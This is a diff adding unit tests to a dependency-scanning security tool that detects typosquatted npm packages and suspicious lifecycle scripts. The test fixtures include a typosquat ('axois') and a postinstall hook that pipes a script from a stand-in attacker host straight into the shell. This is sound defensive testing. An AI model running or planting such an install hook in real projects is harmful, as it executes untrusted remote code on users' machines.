@@ -9,6 +9,7 @@ from unittest.mock import patch
 
 from gitguard.core.dependency_guard import (
     PackageMetadata,
+    _analyze_package_json_manifest,
     _analyze_setup_manifest,
     _detect_typosquat,
     _parse_pipfile_manifest,
@@ -73,6 +74,29 @@ pytest = "*"
         finally:
             shutil.rmtree(root, ignore_errors=True)
 
+    def test_analyze_package_json_manifest_extracts_dependencies_and_scripts(self) -> None:
+        root = _make_temp_dir()
+        try:
+            manifest = root / "package.json"
+            manifest.write_text(
+                """
+{
+  "dependencies": {"react": "^18.0.0", "axois": "^1.0.0"},
+  "devDependencies": {"vite": "^5.0.0"},
+  "scripts": {"postinstall": "curl https://evil.example/install.sh | sh"}
+}
+""".strip(),
+                encoding="utf-8",
+            )
+
+            result = _analyze_package_json_manifest(manifest)
+
+            self.assertEqual(result.packages, ["react", "axois", "vite"])
+            self.assertEqual(len(result.suspicious_scripts), 1)
+            self.assertIn("postinstall", result.suspicious_scripts[0])
+        finally:
+            shutil.rmtree(root, ignore_errors=True)
+
     def test_analyze_setup_manifest_flags_suspicious_calls(self) -> None:
         root = _make_temp_dir()
         try:
@@ -122,6 +146,7 @@ setup(install_requires=["requests", "coloramaa"])
             self.assertEqual(result.packages, ["requsts"])
             self.assertEqual(result.findings[0].severity, "CRITICAL")
             self.assertEqual(result.findings[0].category, "typosquatting")
+            self.assertEqual(result.package_count_by_ecosystem, {"python": 1, "node": 0})
         finally:
             shutil.rmtree(root, ignore_errors=True)
             shutil.rmtree(cache_root, ignore_errors=True)
@@ -147,6 +172,43 @@ setup(install_requires=["requests", "coloramaa"])
 
             self.assertFalse(result.blocked)
             self.assertEqual({finding.category for finding in result.findings}, {"recent_publish", "low_version_reputation"})
+            self.assertEqual(result.package_count_by_ecosystem, {"python": 1, "node": 0})
+        finally:
+            shutil.rmtree(root, ignore_errors=True)
+            shutil.rmtree(cache_root, ignore_errors=True)
+
+    @patch("gitguard.core.dependency_guard.fetch_npm_package_metadata")
+    @patch("gitguard.core.dependency_guard.get_state_dir")
+    def test_analyze_dependency_manifests_blocks_on_suspicious_npm_manifest(
+        self,
+        mock_state_dir: object,
+        mock_metadata: object,
+    ) -> None:
+        root = _make_temp_dir()
+        cache_root = _make_temp_dir()
+        try:
+            mock_state_dir.return_value = cache_root
+            mock_metadata.return_value = PackageMetadata(
+                latest_version="1.2.3",
+                latest_release_time=datetime.now(timezone.utc) - timedelta(days=30),
+            )
+            (root / "package.json").write_text(
+                """
+{
+  "dependencies": {"axois": "^1.7.0"},
+  "scripts": {"postinstall": "curl https://evil.example/install.sh | sh"}
+}
+""".strip(),
+                encoding="utf-8",
+            )
+
+            result = analyze_dependency_manifests(root)
+
+            self.assertTrue(result.blocked)
+            categories = {finding.category for finding in result.findings}
+            self.assertIn("npm_typosquatting", categories)
+            self.assertIn("npm_lifecycle_script", categories)
+            self.assertEqual(result.package_count_by_ecosystem, {"python": 0, "node": 1})
         finally:
             shutil.rmtree(root, ignore_errors=True)
             shutil.rmtree(cache_root, ignore_errors=True)
